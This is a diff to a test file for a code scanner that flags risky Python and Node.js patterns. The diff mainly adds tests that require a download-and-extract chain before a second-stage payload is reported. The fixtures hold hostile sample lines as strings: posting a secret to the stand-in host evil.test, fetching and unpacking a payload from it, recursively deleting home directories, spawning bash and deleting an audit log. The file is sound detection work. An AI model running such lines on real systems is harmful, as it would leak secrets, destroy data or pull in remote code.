@@ -30,7 +30,10 @@ describe("Python scanning", () => {
     data_exfiltration: "requests.post('https://evil.test', data=secret)",
     destructive_behavior: "shutil.rmtree('/home/u')",
     interpreter_escape: "subprocess.run(['bash', '-c', code])",
-    second_stage_payload: "requests.get('https://evil.test/payload.zip')",
+    second_stage_payload: `
+      archive = requests.get('https://evil.test/payload.zip')
+      shutil.unpack_archive('/tmp/payload.zip', '/tmp/payload')
+    `,
   };
 
   for (const category of allCategories) {
@@ -78,8 +81,20 @@ describe("Python scanning", () => {
       || finding.category === "second_stage_payload"
     )).toBe(false);
 
-    expect(scanPython("zipfile.ZipFile(downloaded_archive, 'r')")
-      .findings.some((finding) => finding.category === "second_stage_payload")).toBe(true);
+    for (const source of [
+      "requests.get('https://example.test/payload.zip')",
+      "shutil.unpack_archive('/tmp/local.zip', '/tmp/output')",
+      "zipfile.ZipFile(downloaded_archive, 'r')",
+    ]) {
+      expect(scanPython(source).findings
+        .some((finding) => finding.category === "second_stage_payload")).toBe(false);
+    }
+    expect(scanPython(`
+      requests.get('https://example.test/payload.zip')
+      shutil.unpack_archive('/tmp/payload.zip', '/tmp/output')
+    `).findings.some((finding) =>
+      finding.ruleId === "python.chain.download-extract"
+    )).toBe(true);
     expect(scanPython("os.remove('/var/log/audit.log')")
       .findings.some((finding) => finding.category === "defense_evasion")).toBe(true);
   });
@@ -120,7 +135,10 @@ describe("Node.js scanning", () => {
     data_exfiltration: "fetch('https://evil.test', {method:'POST', body: secret})",
     destructive_behavior: "fs.rmSync('/home/u', {recursive:true})",
     interpreter_escape: "child_process.spawn('bash', ['-c', code])",
-    second_stage_payload: "fetch('https://evil.test/payload.zip')",
+    second_stage_payload: `
+      await fetch('https://evil.test/payload.zip')
+      await tar.extract({ file: '/tmp/payload.zip' })
+    `,
   };
 
   for (const category of allCategories) {
@@ -138,6 +156,31 @@ describe("Node.js scanning", () => {
   it("does not treat an ordinary GET as exfiltration", () => {
     const result = scanJavaScript("fetch('https://example.test/data')");
     expect(result.findings.some((finding) => finding.category === "data_exfiltration")).toBe(false);
+  });
+
+  it("requires a download and extraction chain for Node.js second-stage payloads", () => {
+    for (const source of [
+      "fetch('https://example.test/payload.zip')",
+      "tar.extract({ file: '/tmp/local.tar.gz' })",
+    ]) {
+      expect(scanJavaScript(source).findings
+        .some((finding) => finding.category === "second_stage_payload")).toBe(false);
+    }
+    expect(scanJavaScript(`
+      await fetch('https://example.test/payload.zip')
+      await tar.extract({ file: '/tmp/payload.zip' })
+    `).findings.some((finding) =>
+      finding.ruleId === "javascript.chain.download-extract"
+    )).toBe(true);
+    expect(scanJavaScript(`
+      function install() {
+        fetch('https://example.test/payload.tgz').then(response => {
+          response.body.pipe(tar.extract({ cwd: '/tmp/payload' }))
+        })
+      }
+    `).findings.some((finding) =>
+      finding.ruleId === "javascript.chain.download-extract"
+    )).toBe(true);
   });
 
   it("does not scan dangerous-looking text inside an unrelated call", () => {
